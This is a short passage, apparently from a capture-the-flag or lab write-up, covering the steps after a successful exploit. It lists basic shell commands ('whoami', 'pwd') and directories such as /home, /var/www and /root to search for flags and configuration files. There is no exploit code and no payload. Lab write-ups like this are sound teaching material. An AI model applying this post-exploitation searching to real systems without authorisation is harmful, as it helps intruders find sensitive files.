Step 6: Gaining Shell Access
Once the exploit succeeded, I gained shell access to the target system.

Example commands:

whoami
This shows the current user.

pwd
Displays the current working directory.

From here, I explored the system to locate important files and flags.

Step 7: Post Exploitation
After gaining access, I searched the system for sensitive files.

Common locations to check include:

/home
/var/www
/root
These directories may contain flags or configuration files.

